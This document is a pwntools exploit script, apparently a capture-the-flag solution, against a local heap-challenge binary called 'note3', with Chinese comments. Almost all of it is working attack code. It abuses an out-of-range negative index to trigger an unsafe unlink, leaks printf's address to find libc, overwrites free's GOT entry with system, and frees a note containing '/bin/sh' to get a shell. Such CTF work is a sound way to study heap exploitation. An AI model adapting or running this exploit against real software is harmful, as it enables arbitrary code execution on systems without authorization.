from pwn import*
context(arch='amd64', os='linux', log_level = 'debug', terminal=['tmux', 'splitw', '-h', '-p', '80'])
p = process('./note3')
elf = ELF('./note3')
libc= ELF('/lib/x86_64-linux-gnu/libc.so.6')

def create(size, content):
    p.recvuntil('option--->>\n')
    p.sendline('1')
    p.recvuntil('Input the length of the note content:(less than 1024)\n')
    p.sendline(str(size))
    p.recvuntil('Input the note content:\n')
    p.sendline(content)
def show():
    p.recvuntil('option--->>\n')
    p.sendline('2')
def edit(index, content):
    p.recvuntil('option--->>\n')
    p.sendline('3')
    p.recvuntil('Input the id of the note:\n')
    p.sendline(str(index))
    p.recvuntil('Input the new content:\n')
    p.sendline(content)
def delete(index):
    p.recvuntil('option--->>\n')
    p.sendline('4' )
    p.recvuntil('Input the id of the note:\n')
    p.sendline(str(index))
    
# 修改puts为printf后需要注意读取时去掉\n
def edit_t(index, content):
    p.recvuntil('option--->>')
    p.sendline('3')
    p.recvuntil('Input the id of the note:')
    p.sendline(str(index))
    p.recvuntil('Input the new content:')
    p.sendline(content)
def delete_t(index):
    p.recvuntil('option--->>')
    p.sendline('4' )
    p.recvuntil('Input the id of the note:')
    p.sendline(str(index))
    
free_got    = elf.got['free']
printf_plt  = elf.plt['printf']
printf_got  = elf.got['printf']

create(0x80, b'/bin/sh\x00')    # 0x90
create(0x80, b'/bin/sh\x00')    # 0x90
create(0x80, b'/bin/sh\x00')    # 0x90
create(0x80, b'/bin/sh\x00')    # 0x90
create(0x80, b'/bin/sh\x00')    # 0x90
create(0x80, b'/bin/sh\x00')    # 0x90
create(0x80, b'/bin/sh\x00')    # 0x90

delete(3)                       # 设置-1的位置为第四个content
create(0x80, b'/bin/sh\x00')    # 0x90

# 触发unlink，实现任意修改content的数组
mem = 0x6020C8 + 8 * 3
FD  = mem - 0x18
BK  = mem - 0x10
payload = p64(0) + p64(0x81)
payload += p64(FD) + p64(BK)
payload += b'a' * 0x60
payload += p64(0x80) + p64(0x90)
edit(-9223372036854775808, payload)
delete(4)

# 获取glibc地址
edit(3,  p64(free_got) + p64(printf_got))
edit(0, p64(printf_plt) + p64(printf_plt))
delete_t(1)
printf_addr = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = printf_addr - libc.symbols['printf']
system_addr = libc_base + libc.symbols['system']
print("printf的地址 " + hex(printf_addr))
print("libc的基址 " + hex(libc_base))
print("system的地址 " + hex(system_addr))

# 设置free_got为system
edit_t(0, p64(system_addr) + p64(printf_plt))

# 触发system('/bin/sh\x00')
delete_t(5)
p.interactive()
